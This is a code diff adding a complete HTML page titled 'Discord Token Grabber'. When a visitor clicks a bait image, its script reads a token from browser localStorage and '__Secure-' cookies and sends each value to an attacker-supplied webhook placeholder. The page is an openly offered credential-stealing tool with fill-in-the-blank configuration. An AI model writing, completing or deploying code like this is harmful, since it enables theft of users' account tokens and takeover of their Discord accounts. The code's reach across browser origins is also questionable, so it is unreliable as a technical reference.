@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Token Grabber</title>
+    <script>
+        function grabToken() {
+            // Replace this with your webhook URL
+            const webhookUrl = 'YOUR_WEBHOOK_URL';
+
+            // Function to send the token to the webhook
+            function sendToken(token) {
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: `Discord Token: ${token}`
+                    })
+                });
+            }
+
+            // Function to get the Discord token from local storage
+            function getDiscordToken() {
+                const token = localStorage.getItem('token');
+                if (token) {
+                    sendToken(token);
+                } else {
+                    console.log('No Discord token found.');
+                }
+            }
+
+            // Function to get the Discord token from cookies
+            function getDiscordTokenFromCookies() {
+                const cookies = document.cookie.split(';');
+                for (let i = 0; i < cookies.length; i++) {
+                    const cookie = cookies[i].trim();
+                    if (cookie.startsWith('__Secure-')) {
+                        const token = cookie.split('=')[1];
+                        if (token) {
+                            sendToken(token);
+                            return;
+                        }
+                    }
+                }
+                console.log('No Discord token found in cookies.');
+            }
+
+            // Try to get the token from local storage first
+            getDiscordToken();
+
+            // If not found, try to get the token from cookies
+            getDiscordTokenFromCookies();
+        }
+    </script>
+</head>
+<body>
+    <h1>Click the image below to grab the Discord token</h1>
+    <a href="javascript:void(0);" onclick="grabToken()">
+        <img src="YOUR_IMAGE_URL" alt="Click me" style="cursor: pointer;">
+    </a>
+</body>
+</html>
